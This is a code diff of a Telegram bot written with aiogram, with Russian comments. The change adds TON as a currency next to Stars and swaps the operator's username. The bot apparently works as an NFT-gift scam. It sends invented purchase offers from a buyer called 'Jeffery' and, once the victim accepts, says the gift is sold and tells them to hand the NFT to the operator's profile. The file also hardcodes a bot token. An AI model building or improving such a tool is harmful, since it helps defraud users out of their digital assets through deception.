@@ -11,7 +11,7 @@ from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
 BOT_TOKEN = "9232714745:AAF5jlp52Y99F1fHbSinG7CRitLNoUQCSoY" # Вставь токен от BotFather
-MY_USERNAME = "virtfizu" # Твой юзернейм без @
+MY_USERNAME = "nokotsr" # Твой юзернейм без @
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -21,28 +21,53 @@ offers_db = {}
 def generate_code():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
 
+# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ВАЛЮТЫ ---
+def format_currency(amount, currency):
+    if currency.lower() == "ton":
+        return f"{amount} TON"
+    else:
+        return f"{amount} ⭐"
+
 # --- СОЗДАНИЕ ОФФЕРА ---
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    await message.answer("Бот запущен. Пиши: `of \"Ссылка\" \"Сумма\" \"stars\" \"ru\"`", parse_mode="Markdown")
+    await message.answer(
+        "Бот запущен.\n\n"
+        "Формат: `of \"Ссылка\" \"Сумма\" \"stars/ton\" \"ru\"`\n"
+        "Пример: `of \"https://t.me/nft/...\" \"5\" \"ton\" \"ru\"`", 
+        parse_mode="Markdown"
+    )
 
 @dp.message(F.text.startswith('of "'))
 async def create_offer(message: types.Message):
     try:
         text = message.text.replace("of ", "").replace('"', '')
         parts = text.split(" ")
+        
         if len(parts) < 4:
-            await message.answer("Ошибка формата.")
+            await message.answer("Ошибка формата. Пример: of \"Ссылка\" \"5\" \"ton\" \"ru\"")
             return
+        
         lang = parts[-1]
+        currency = parts[-2].lower() # stars или ton
         amount = parts[-3]
         nft_name = " ".join(parts[:-3])
+        
+        if currency not in ["stars", "ton"]:
+            await message.answer("Ошибка! Валюта должна быть 'stars' или 'ton'.")
+            return
+
         code = generate_code()
         
-        offers_db[code] = {"nft_name": nft_name, "amount": amount, "lang": lang}
+        offers_db[code] = {
+            "nft_name": nft_name, 
+            "amount": amount, 
+            "currency": currency,
+            "lang": lang
+        }
         
         await message.answer(f"Оффер сохранён!\nКод: `/of {code}`", parse_mode="Markdown")
-        print(f"Создан: {code}")
+        print(f"Создан: {code} | {amount} {currency}")
     except Exception as e:
         await message.answer(f"Ошибка: {e}")
 
@@ -60,11 +85,14 @@ async def activate_offer(message: types.Message):
     except Exception as e:
         print(f"Ошибка удаления: {e}")
 
+    # Форматируем сумму (TON или Звезды)
+    formatted_amount = format_currency(offer_data["amount"], offer_data["currency"])
+
     if offer_data["lang"] == "ru":
-        text = f"<b>Jeffery готов(а) дать {offer_data['amount']} ⭐</b>\n<b>за <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Действует ещё 23h 59m.</b>"
+        text = f"<b>Jeffery готов(а) дать {formatted_amount}</b>\n<b>за <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Действует ещё 23h 59m.</b>"
         btn1, btn2 = "Принять", "Отклонить"
     else:
-        text = f"<b>Jeffery is ready to give {offer_data['amount']} ⭐</b>\n<b>for <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Valid for another 23h 59m.</b>"
+        text = f"<b>Jeffery is ready to give {formatted_amount}</b>\n<b>for <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Valid for another 23h 59m.</b>"
         btn1, btn2 = "Accept", "Decline"
 
     builder = InlineKeyboardBuilder()
@@ -73,14 +101,17 @@ async def activate_offer(message: types.Message):
         InlineKeyboardButton(text=btn2, callback_data=f"dec_{code}")
     )
 
-    await bot.send_message(
-        chat_id=message.chat.id,
-        text=text,
-        reply_markup=builder.as_markup(),
-        parse_mode=ParseMode.HTML,
-        business_connection_id=b_conn_id,
-        link_preview_options={"is_disabled": False}
-    )
+    try:
+        await bot.send_message(
+            chat_id=message.chat.id,
+            text=text,
+            reply_markup=builder.as_markup(),
+            parse_mode=ParseMode.HTML,
+            business_connection_id=b_conn_id,
+            link_preview_options={"is_disabled": False}
+        )
+    except Exception as e:
+        print(f"Ошибка: {e}")
 
 # --- КНОПКА ПРИНЯТЬ ---
 @dp.callback_query(F.data.startswith("acc_"))
@@ -100,19 +131,19 @@ async def process_accept(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-# --- КНОПКА ОК (ТУТ ДВЕ КНОПКИ) ---
+# --- КНОПКА ОК (ДВЕ КНОПКИ) ---
 @dp.callback_query(F.data.startswith("ok_"))
 async def process_ok(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
     b_conn_id = callback.message.business_connection_id
     if code in offers_db:
         data = offers_db[code]
-        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
+        formatted_amount = format_currency(data["amount"], data["currency"])
+        
+        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {formatted_amount}."
         
         builder = InlineKeyboardBuilder()
-        # 1. Кнопка на твой профиль
         builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
-        # 2. Кнопка с инструкцией
         builder.row(InlineKeyboardButton(text="Как передать NFT?", callback_data=f"how_{code}"))
         
         await bot.edit_message_text(
@@ -153,7 +184,8 @@ async def process_back(callback: types.CallbackQuery):
     b_conn_id = callback.message.business_connection_id
     if code in offers_db:
         data = offers_db[code]
-        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
+        formatted_amount = format_currency(data["amount"], data["currency"])
+        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {formatted_amount}."
         
         builder = InlineKeyboardBuilder()
         builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
